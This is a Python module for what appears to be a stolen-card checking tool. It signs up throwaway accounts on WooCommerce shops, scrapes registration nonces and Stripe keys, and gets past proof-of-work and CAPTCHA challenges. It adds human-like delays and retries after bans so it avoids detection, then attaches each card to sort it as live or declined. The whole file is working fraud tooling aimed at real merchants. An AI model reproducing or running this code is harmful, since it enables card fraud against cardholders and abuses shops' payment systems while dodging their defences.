import re
import logging
import time
from urllib.parse import urlparse
from config import get_proxy_dict, get_random_ua, get_gate_setting, fake, WC_ACCOUNT_PATHS, get_next_site, STRIPE_WC_SITE_POOL
from stripe_common import (
    make_session, get_auth_rate_limiter, is_ban_signal, is_refresh_error,
    handle_pow_and_captcha, extract_stripe_key, tokenize_card, parse_token_error,
    classify_setup_response,
    error_result, format_result, rnd_email, gets, generate_fingerprint,
    STRIPE_VERSIONS, CCN_KEYWORDS, LIVE_KEYWORDS,
    reading_delay, page_interaction_delay, pre_submit_delay, retry_delay,
)

logger = logging.getLogger(__name__)

_rl = get_auth_rate_limiter()


def check_stripe_auth(cc, mm, yy, cvv, site_url=None, pub_key=None):
    site_url = (site_url or get_gate_setting("stripe_auth", "site_url", "") or get_next_site("stripe") or "https://simplygreatdeals.co.uk").rstrip('/')
    pub_key = pub_key or get_gate_setting("stripe_auth", "stripe_pub_key", "")

    if len(yy) == 4:
        yy = yy[2:]
    if len(mm) == 1:
        mm = f"0{mm}"

    max_retries = 3
    last_error = "Unknown error"

    for attempt in range(max_retries):
        s = make_session(use_proxy=False)
        try:
            result = _do_auth_check(s, cc, mm, yy, cvv, site_url, pub_key)

            detail_text = result.get("detail", "")
            if is_ban_signal(detail_text):
                _rl.record_rate_limit()
                result["_retry"] = True

            if result.get("_retry"):
                last_error = result.get("detail", "Session error")
                logger.info(f"Stripe Auth retry {attempt+1}/{max_retries}: {last_error[:60]}")
                s.close()
                if attempt < max_retries - 1:
                    retry_delay(attempt)
                continue

            _rl.record_success()
            return result

        except Exception as e:
            err_text = str(e).lower()
            if any(sig in err_text for sig in ["429", "too many", "rate limit"]):
                _rl.record_rate_limit()
            elif any(sig in err_text for sig in ["403", "forbidden", "blocked"]):
                _rl.record_ban()

            logger.error(f"Stripe Auth error (attempt {attempt+1}): {str(e)[:80]}")
            last_error = str(e)[:80]
            if attempt < max_retries - 1:
                retry_delay(attempt)
        finally:
            try:
                s.close()
            except Exception:
                pass

    return error_result(cc, mm, yy, cvv, f"Failed after {max_retries} retries: {last_error}", "Stripe Auth")


def _do_auth_check(s, cc, mm, yy, cvv, site_url, pub_key):
    proxy_used = s.__dict__.get('_proxy_used')
    gate_name = "Stripe Auth"

    configured_path = get_gate_setting("stripe_auth", "account_path", "")
    if configured_path:
        account_paths = [configured_path] + [p for p in WC_ACCOUNT_PATHS if p != configured_path]
    else:
        account_paths = list(WC_ACCOUNT_PATHS)

    _rl.wait_if_needed()
    resp = None
    acct_path = '/my-account/'
    for try_path in account_paths:
        try:
            resp = s.get(f'{site_url}{try_path}', verify=False, timeout=20, allow_redirects=True)
            if resp.status_code == 200 and 'woocommerce-register-nonce' in resp.text:
                acct_path = try_path
                break
            elif resp.status_code == 200:
                acct_path = try_path
        except Exception:
            continue

    if not resp or resp.status_code != 200:
        status_code = resp.status_code if resp else 0
        if status_code == 429:
            _rl.record_rate_limit()
            return {**error_result(cc, mm, yy, cvv, "Rate Limited by site", gate_name), "_retry": True}
        elif status_code == 403:
            _rl.record_ban(180)
            return {**error_result(cc, mm, yy, cvv, "Blocked by site (403)", gate_name), "_retry": True}
        return {**error_result(cc, mm, yy, cvv, f"Cannot reach site account page", gate_name), "_retry": True}

    page_html = resp.text

    page_html, pow_err = handle_pow_and_captcha(s, page_html, f'{site_url}{acct_path}')
    if pow_err:
        return {**error_result(cc, mm, yy, cvv, pow_err, gate_name), "_retry": True}

    reading_delay(len(page_html))

    nonce = gets(page_html, 'name="woocommerce-register-nonce" value="', '"')
    if not nonce:
        nonce = gets(page_html, "woocommerce-register-nonce\" value=\"", "\"")
    if not nonce:
        nonce_match = re.search(r'woocommerce-register-nonce["\s]+value=["\']([^"\']+)', page_html)
        if nonce_match:
            nonce = nonce_match.group(1)

    if not nonce:
        return {**error_result(cc, mm, yy, cvv, "Register nonce not found", gate_name), "_retry": True}

    acc_email = rnd_email()
    acc_pass = acc_email

    page_interaction_delay(len(page_html))

    final_path = resp.url.replace(site_url, '') if resp.url.startswith(site_url) else acct_path
    if not final_path or final_path == '/':
        final_path = acct_path

    reg_data = {
        'email': acc_email,
        'password': acc_pass,
        'woocommerce-register-nonce': nonce,
        '_wp_http_referer': final_path,
        'register': 'Register',
    }
    reg_headers = {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': site_url,
        'Referer': f'{site_url}{final_path}',
    }

    try:
        _rl.wait_if_needed()
        reg_resp = s.post(resp.url, headers=reg_headers, data=reg_data, verify=False, timeout=20, allow_redirects=True)
    except Exception as e:
        return {**error_result(cc, mm, yy, cvv, f"Registration failed: {str(e)[:50]}", gate_name), "_retry": True}

    logger.info("Stripe Auth: registered account")

    pm_paths = [
        f'{acct_path}add-payment-method/' if not acct_path.endswith('add-payment-method/') else acct_path,
        '/my-account-2/add-payment-method/',
        '/my-account/add-payment-method/',
        '/account/add-payment-method/',
    ]
    pm_resp = None
    for pm_path in pm_paths:
        try:
            _rl.wait_if_needed()
            pm_resp = s.get(f'{site_url}{pm_path}', verify=False, timeout=20, allow_redirects=True)
            if pm_resp.status_code == 200 and ('add_card_nonce' in pm_resp.text or 'stripe' in pm_resp.text.lower()):
                break
        except Exception:
            continue

    if not pm_resp or pm_resp.status_code != 200:
        return {**error_result(cc, mm, yy, cvv, "Payment page failed", gate_name), "_retry": True}

    pm_html = pm_resp.text

    pm_html, pow_err = handle_pow_and_captcha(s, pm_html, f'{site_url}{pm_path}')
    if pow_err:
        return {**error_result(cc, mm, yy, cvv, pow_err, gate_name), "_retry": True}

    add_nonce = gets(pm_html, '"add_card_nonce":"', '"')
    if not add_nonce:
        add_nonce = gets(pm_html, 'add_card_nonce":"', '"')
    if not add_nonce:
        nonce_match = re.search(r'add_card_nonce["\s:]+["\']([^"\']+)', pm_html)
        if nonce_match:
            add_nonce = nonce_match.group(1)

    wc_pm_nonce = None
    if not add_nonce:
        wc_pm_match = re.search(r'woocommerce-add-payment-method-nonce["\s]*value=["\']([^"\']+)', pm_html)
        if wc_pm_match:
            wc_pm_nonce = wc_pm_match.group(1)
        if not wc_pm_nonce:
            wc_pm_match2 = re.search(r'name="_wpnonce"[^>]*value="([^"]+)"', pm_html)
            if wc_pm_match2:
                wc_pm_nonce = wc_pm_match2.group(1)

    if not add_nonce and not wc_pm_nonce:
        return {**error_result(cc, mm, yy, cvv, "Add card nonce not found", gate_name), "_retry": True}

    page_pk = extract_stripe_key(pm_html)
    final_key = pub_key or page_pk
    if not final_key:
        return error_result(cc, mm, yy, cvv, "No Stripe key found", gate_name)

    logger.info("Stripe Auth: gate ready")

    pm_id, pm_err, card_brand = tokenize_card(cc, mm, yy, cvv, final_key, site_url, _rl)

    if not pm_id:
        status, detail = parse_token_error(pm_err)
        logger.info(f"Stripe Auth tokenization: {status}")
        if is_refresh_error(detail):
            return {**error_result(cc, mm, yy, cvv, detail, gate_name), "_retry": True}
        return format_result(status, cc, mm, yy, cvv, detail, gate_name, card_brand, proxy_used)

    logger.info(f"Stripe Auth PM created: brand={card_brand}")

    pre_submit_delay()

    pm_referer_path = pm_resp.url.replace(site_url, '') if pm_resp.url.startswith(site_url) else '/my-account/add-payment-method/'

    if add_nonce:
        setup_headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': site_url,
            'Referer': f'{site_url}{pm_referer_path}',
            'X-Requested-With': 'XMLHttpRequest',
        }
        setup_data = {
            'stripe_source_id': pm_id,
            'nonce': add_nonce,
        }

        try:
            _rl.wait_if_needed()
            setup_resp = s.post(
                f'{site_url}/?wc-ajax=wc_stripe_create_setup_intent',
                headers=setup_headers, data=setup_data, verify=False, timeout=20
            )
        except Exception as e:
            return {**error_result(cc, mm, yy, cvv, f"Setup intent failed: {str(e)[:50]}", gate_name), "_retry": True}
    else:
        setup_headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': site_url,
            'Referer': f'{site_url}{pm_referer_path}',
        }
        setup_data = {
            'payment_method': 'stripe',
            'stripe_source_id': pm_id,
            'woocommerce-add-payment-method-nonce': wc_pm_nonce,
            '_wp_http_referer': pm_referer_path,
        }

        try:
            _rl.wait_if_needed()
            setup_resp = s.post(
                f'{site_url}{pm_referer_path}',
                headers=setup_headers, data=setup_data, verify=False, timeout=20, allow_redirects=True
            )
        except Exception as e:
            return {**error_result(cc, mm, yy, cvv, f"Add payment failed: {str(e)[:50]}", gate_name), "_retry": True}

    resp_text = setup_resp.text
    logger.info(f"Stripe Auth setup response: {resp_text[:200]}")

    if wc_pm_nonce and not add_nonce:
        resp_lower = resp_text.lower()
        if 'payment method successfully added' in resp_lower or 'payment-methods' in setup_resp.url:
            logger.info("Stripe Auth result: live - Payment method added")
            return format_result('live', cc, mm, yy, cvv, "Payment method successfully added", gate_name, card_brand, proxy_used)

        err_match = re.search(r'<ul[^>]*class="[^"]*woocommerce-error[^"]*"[^>]*>\s*<li[^>]*>(.*?)</li>', resp_text, re.S)
        if not err_match:
            err_match = re.search(r'class="woocommerce-error"[^>]*>\s*<li[^>]*>(.*?)</li>', resp_text, re.S)
        if not err_match:
            err_match = re.search(r'woocommerce-notices-wrapper[^>]*>\s*<ul[^>]*>\s*<li[^>]*>(.*?)</li>', resp_text, re.S)
        if not err_match:
            err_match = re.search(r'class="woocommerce-message"[^>]*>(.*?)<', resp_text, re.S)
        if not err_match:
            declined_match = re.search(r'(your card was declined|card has been declined|transaction.*(?:declined|failed)|do not honor|insufficient funds|invalid card|expired card|incorrect cvc)', resp_text, re.I)
            if declined_match:
                err_match = declined_match

        if err_match:
            err_msg = re.sub(r'<[^>]+>', '', err_match.group(1)).strip()
            status_r = 'declined'
            err_low = err_msg.lower()
            if any(w in err_low for w in ['insufficient', 'do_not_honor', 'restricted', 'lost', 'stolen', 'pickup']):
                status_r = 'ccn'
            elif 'success' in err_low or 'approved' in err_low:
                status_r = 'live'
            logger.info(f"Stripe Auth result: {status_r} - {err_msg}")
            return format_result(status_r, cc, mm, yy, cvv, err_msg, gate_name, card_brand, proxy_used)

        final_url = setup_resp.url.lower() if hasattr(setup_resp, 'url') else ''
        if 'payment-methods' in final_url and 'add-payment-method' not in final_url:
            if 'woocommerce-error' not in resp_lower:
                logger.info("Stripe Auth result: live - Redirected to payment methods")
                return format_result('live', cc, mm, yy, cvv, "Payment method added (redirect)", gate_name, card_brand, proxy_used)
        if 'woocommerce-myaccount-payment-methods' in resp_lower:
            if 'woocommerce-error' not in resp_lower:
                logger.info("Stripe Auth result: live - Payment methods page (no error)")
                return format_result('live', cc, mm, yy, cvv, "Payment method added", gate_name, card_brand, proxy_used)

        if 'add-payment-method' in final_url or 'add_payment_method' in resp_lower:
            logger.info("Stripe Auth result: declined - Redirected back to form")
            return format_result('declined', cc, mm, yy, cvv, "Card declined (form redirect)", gate_name, card_brand, proxy_used)

        logger.info("Stripe Auth result: declined - No success signal in WC response")
        return format_result('declined', cc, mm, yy, cvv, "Card declined", gate_name, card_brand, proxy_used)

    if is_ban_signal(resp_text):
        _rl.record_rate_limit()
        return {**error_result(cc, mm, yy, cvv, "Rate limited", gate_name), "_retry": True}

    if is_refresh_error(resp_text):
        return {**error_result(cc, mm, yy, cvv, "Session expired", gate_name), "_retry": True}

    status, detail = classify_setup_response(resp_text)
    logger.info(f"Stripe Auth result: {status} - {detail}")
    return format_result(status, cc, mm, yy, cvv, detail, gate_name, card_brand, proxy_used)


def setup_stripe_auth_from_url(full_url):
    from config import set_gate_setting as _set_gs
    import requests as req

    results = {
        "success": False,
        "errors": [],
        "auto_detected": [],
    }

    full_url = full_url.strip()
    if not full_url.startswith("http"):
        full_url = f"https://{full_url}"

    parsed = urlparse(full_url)
    site_url = f"{parsed.scheme}://{parsed.netloc}"

    new_settings = {}
    try:
        s = req.Session()
        s.headers.update({'User-Agent': get_random_ua()})

        r = s.get(site_url, verify=False, timeout=15, allow_redirects=True)
        if r.status_code != 200:
            results["errors"].append(f"Site returned HTTP {r.status_code}")
            return results

        results["auto_detected"].append(f"Site URL: {site_url}")
        new_settings["site_url"] = site_url
        all_html = r.text

        probe_pages = [
            "/my-account/", "/my-account-2/", "/account/",
            "/my-account/add-payment-method/", "/my-account-2/add-payment-method/",
            "/account/add-payment-method/",
            "/checkout/",
        ]
        for pg in probe_pages:
            try:
                pr = s.get(f"{site_url}{pg}", verify=False, timeout=10, allow_redirects=True)
                if pr.status_code == 200:
                    all_html += "\n" + pr.text
                    results["auto_detected"].append(f"Page probed: {pg}")
            except Exception:
                continue

        for pg_path in ["/my-account-2/", "/my-account/", "/account/"]:
            full_pg = f"{site_url}{pg_path}"
            try:
                test_r = s.get(full_pg, verify=False, timeout=10, allow_redirects=True)
                if test_r.status_code == 200 and ('woocommerce-register-nonce' in test_r.text.lower() or 'woocommerce-login-nonce' in test_r.text.lower()):
                    new_settings["account_path"] = pg_path
                    results["auto_detected"].append(f"Account path: {pg_path}")
                    _set_gs("stripe_auth", "account_path", pg_path)
                    break
            except Exception:
                continue

        pk_match = re.search(r'(pk_(?:live|test)_[A-Za-z0-9]{20,})', all_html)
        if pk_match:
            found_pk = pk_match.group(1)
            new_settings["stripe_pub_key"] = found_pk
            results["auto_detected"].append(f"Stripe key: {found_pk[:25]}...")
        else:
            results["errors"].append("No Stripe key found - set via /setconfig [id] key [pk_live_...]")

        html_lower = all_html.lower()
        if 'woocommerce-register-nonce' in html_lower:
            results["auto_detected"].append("WooCommerce registration: detected")
        elif 'woocommerce-login-nonce' in html_lower:
            results["auto_detected"].append("WooCommerce login: detected")
        else:
            results["errors"].append("No WooCommerce auth forms found")

        if 'add-payment-method' in html_lower or 'add_card_nonce' in html_lower:
            results["auto_detected"].append("Add payment method page: found")
        else:
            results["errors"].append("Add payment method page not detected")

        if 'wc_stripe_create_setup_intent' in html_lower:
            results["auto_detected"].append("Stripe setup intent endpoint: found")

        if 'pow_nonce' in html_lower or 'verifying' in html_lower:
            results["auto_detected"].append("PoW challenge: detected (auto-solved)")
        if 'hcaptcha' in html_lower or 'recaptcha' in html_lower or 'turnstile' in html_lower:
            captcha_types = []
            if 'hcaptcha' in html_lower:
                captcha_types.append('hCaptcha')
            if 'recaptcha' in html_lower:
                captcha_types.append('reCAPTCHA')
            if 'turnstile' in html_lower:
                captcha_types.append('Turnstile')
            results["auto_detected"].append(f"CAPTCHA: {', '.join(captcha_types)} detected")

        acct_match = re.search(r'"accountId"\s*:\s*"(acct_[^"]+)"', all_html)
        if acct_match:
            results["auto_detected"].append(f"Stripe Account: {acct_match.group(1)[:20]}...")

        has_key = "stripe_pub_key" in new_settings
        has_wc = 'woocommerce' in html_lower

        if has_key and has_wc:
            results["success"] = True
            for k, v in new_settings.items():
                _set_gs("stripe_auth", k, v)
        elif has_key:
            results["success"] = True
            for k, v in new_settings.items():
                _set_gs("stripe_auth", k, v)
            results["errors"].append("WooCommerce not confirmed - may need manual config")
        else:
            results["errors"].append("Setup incomplete - need Stripe pub key")

    except Exception as e:
        results["errors"].append(f"Setup error: {str(e)[:80]}")

    return results
